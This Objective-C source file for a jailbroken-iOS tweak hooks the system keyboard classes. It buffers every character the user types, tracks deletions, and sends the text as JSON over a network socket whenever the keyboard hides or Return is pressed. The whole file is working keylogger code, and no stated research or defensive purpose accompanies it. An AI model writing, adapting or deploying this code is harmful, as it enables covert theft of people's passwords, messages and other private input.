#import "SocketClass.h"
#import "Utils.h"

NSMutableString *INPUT = [[NSMutableString alloc] initWithCapacity:100];
extern SocketClass *gsocket;
//hook the text button
%hook UIKeyboardImpl

-(void)callShouldInsertText:(id) input{
    
    if(![input isEqualToString: @"\n"]){
//        SocketClass *socket = [[SocketClass alloc] init];
//        [socket SendSocket:input];
        [INPUT appendString:input];
    }
    %orig;
}

- (void)keyboardDidHide:(id)arg1{
    if([INPUT length]>0){
//        NSString *inputString = [NSString stringWithFormat:@"input:%@",INPUT]; 
        NSString *inputString=[Utils getJsonStrWithDic:INPUT andType:@"input"];
//        SocketClass *mysocket = [[SocketClass alloc] init];
//        [mysocket SendSocket:(NSString *)inputString];
        [gsocket SendSocket:(NSString *)inputString];
        [INPUT setString:@""];
    }
    %orig;
}
%end

//hook the delete button
%hook UIKeyboardLayoutStar
- (void)completeRetestForTouchUp:(id)arg1 timestamp:(double)arg2 interval:(double)arg3 executionContext:(id)arg4
{
    NSString *name = [[arg1 performSelector:@selector(key)] performSelector:@selector(name)];
    if([name isEqualToString:@"Delete-Key"] || [name isEqualToString:@"NumberPad-Delete"]){
        //delete
        if([INPUT length] > 0){
            NSRange deleteRange = { [INPUT length] - 1, 1 };
            [INPUT deleteCharactersInRange:deleteRange];
        }
    }else if([name isEqualToString:@"Return-Key"]){
        if([INPUT length]>0){
//            NSString *inputString = [NSString stringWithFormat:@"input:%@",INPUT]; 
            NSString *inputString=[Utils getJsonStrWithDic:INPUT andType:@"input"];
//            SocketClass *mysocket = [[SocketClass alloc] init];
//            [mysocket SendSocket:(NSString *)inputString];
            [gsocket SendSocket:(NSString *)inputString];
            [INPUT setString:@""];
        }
    }
    return %orig;
}
%end